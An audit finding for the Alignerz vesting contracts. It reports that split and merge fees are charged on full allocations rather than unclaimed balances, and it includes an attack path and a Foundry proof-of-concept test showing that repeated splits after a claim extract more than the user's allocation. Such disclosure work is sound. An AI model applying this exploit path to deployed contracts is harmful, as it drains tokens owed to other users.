# [000804] Incorrect Fee Calculation on Split/Merge Operations Leads to Protocol Insolvency
  
  ### Summary

Calculating fees based on total allocation amounts instead of remaining unclaimed amounts will cause protocol insolvency for the contract as more tokens will be extracted than their entitled allocation through repeated split operations after partial claims.

### Root Cause

In `FeesManager.sol:calculateFeeAndNewAmountForOneTVS()` and its usage in `AlignerzVesting.sol:splitTVS()` and `mergeTVS()`, the fee calculation uses the total `allocation.amounts` values without accounting for already claimed tokens. This causes the protocol to transfer out fees based on the full allocation amount even when most tokens have already been claimed by the user, leading to a mismatch between the contract's actual token holdings and its accounting obligations.

[Passing full amount to fee calculation](https://github.com/dualguard/2025-11-alignerz/blob/main/protocol/src/contracts/vesting/AlignerzVesting.sol#L1011-L1013)

[Fee calculation](https://github.com/dualguard/2025-11-alignerz/blob/main/protocol/src/contracts/vesting/feesManager/FeesManager.sol#L171-L172)

### Internal Pre-conditions

_No response_

### External Pre-conditions

_No response_

### Attack Path

1. User places a bid and receives an NFT with a token allocation (e.g., 100,000 tokens vesting over 90 days)
2. User waits until near the end of the vesting period (e.g., 89 days) and claims their vested tokens (approximately 98,889 tokens claimed)
3. User calls `splitTVS()` with their NFT, splitting it into multiple NFTs (e.g., 5 times with 1% and 99% splits)
4. Each split operation calculates fees based on the original `amounts[i]` values (100,000 tokens) rather than the remaining unclaimed balance (~1,111 tokens)
5. The protocol transfers out fee amounts that exceed the actual remaining tokens in the allocation, effectively paying fees from other users' allocations
6. After multiple splits, the sum of (tokens claimed + fees paid to treasury) exceeds the user's original allocation amount


### Impact

The protocol suffers a loss equal to the excess fees transferred out, which can be significant with repeated split operations. In the provided PoC, the treasury receives fees plus user claims that exceed the original allocation (`treasuryFeesFromSplits + bidderTokensClaimed > BIDDER_USD`). This creates an accounting deficit where the contract's token balance cannot cover all allocation obligations, leading to potential insolvency and last users being unable to claim their full entitlements.

### PoC

```solidity
import {A26ZDividendDistributor} from "../src/contracts/A26ZDividendDistributor/A26ZDividendDistributor.sol";

function test_Split_Overtaking_Fees_POC() public {
    A26ZDividendDistributor public distributor = new A26ZDividendDistributor(address(vesting), address(nft), address(usdt), block.timestamp, 1 days, address(token));
    distributor.transferOwnership(projectCreator);

    vm.startPrank(projectCreator);
    vesting.setSplitFeeRate(200);
    vesting.setVestingPeriodDivisor(1);

    // 1. Launch project
    vesting.launchBiddingProject(address(token), address(usdt), block.timestamp, block.timestamp + 1_000_000, "0x0", true);

    // 2. Create multiple pools with different prices
    vesting.createPool(PROJECT_ID, 3_000_000 ether, 0.01 ether, true);
    vesting.createPool(PROJECT_ID, 3_000_000 ether, 0.02 ether, false);
    vesting.createPool(PROJECT_ID, 4_000_000 ether, 0.03 ether, false);

    // 3. Place bids from different whitelisted users
    vesting.addUserToWhitelist(bidders[0], PROJECT_ID);
    vm.stopPrank();

    vm.startPrank(bidders[0]);
    usdt.approve(address(vesting), BIDDER_USD);
    vesting.placeBid(PROJECT_ID, BIDDER_USD, 90 days);
    vm.stopPrank();

    // 4. Prepare bid allocations (this would be done off-chain)
    BidInfo[] memory allBids = new BidInfo[](2);

    for (uint256 i = 0; i < 2; i++) {
        allBids[i] = BidInfo({
            bidder: bidders[i],
            amount: BIDDER_USD,
            vestingPeriod: 60 days,
            poolId: 0,
            accepted: true
        });
    }

    // 6. Generate merkle roots for each pool
    bytes32[] memory poolRoots = new bytes32[](3);
    for (uint256 poolId = 0; poolId < 3; poolId++) {
        poolRoots[poolId] = generateMerkleProofs(allBids, poolId);
    }

    // 7. Finalize project with merkle roots
    vm.prank(projectCreator);
    vesting.finalizeBids(PROJECT_ID, refundRoot, poolRoots, 60);

    // 8. Users claim NFTs with proofs
    uint256[] memory nftIds = new uint256[](1);
    vm.startPrank(bidders[0]);
    uint256 nftId = vesting.claimNFT(PROJECT_ID, 0, BIDDER_USD, bidderProofs[bidders[0]]);
    nftIds[0] = nftId;
    bidderNFTIds[bidders[0]] = nftId;
    assertEq(nft.ownerOf(nftId), bidders[0]);
    vm.stopPrank();

    // 9. Fast forward time to simulate vesting period, claiming before vesting is 100% completed
    vm.warp(block.timestamp + 90 days - 1);

    // 10. Users claim tokens after vesting period
    uint256 tokenBalanceBefore = token.balanceOf(bidders[0]);
    vm.startPrank(bidders[0]);
    vesting.claimTokens(PROJECT_ID, nftIds[0]);
    uint256 tokenBalanceAfter = token.balanceOf(bidders[0]);
    assertTrue(tokenBalanceAfter > tokenBalanceBefore, "No tokens claimed");
    vm.stopPrank();
    uint256 bidderTokensClaimed = tokenBalanceAfter - tokenBalanceBefore;

    // 11. Splitting TVS to multiple NFTs
    vm.startPrank(bidders[0]);
    uint256 splitNumber = 5;
    uint256[] memory percentages = new uint256[](2);
    percentages[0] = 1;
    percentages[1] = 9_999;
    uint256 currentNftId = nftId;
    distributor.getUnclaimedAmounts(currentNftId);
    uint256 treasuryFeesFromSplits = token.balanceOf(treasury);
    for (uint256 i = 0; i < splitNumber; i ++) {
        (uint256 oldNft, uint256[] memory newNft) = vesting.splitTVS(PROJECT_ID, percentages, currentNftId);
        currentNftId = newNft[0];
    }
    vm.stopPrank();
    treasuryFeesFromSplits = token.balanceOf(treasury) - treasuryFeesFromSplits;

    // !! The treasury fees + bidders token claims are more than the bidder's total token allocation
    assertGt(treasuryFeesFromSplits + bidderTokensClaimed, BIDDER_USD);
}
```

### Mitigation

Modify the fee calculation to be based on the remaining unclaimed amounts rather than the total allocation amounts.
  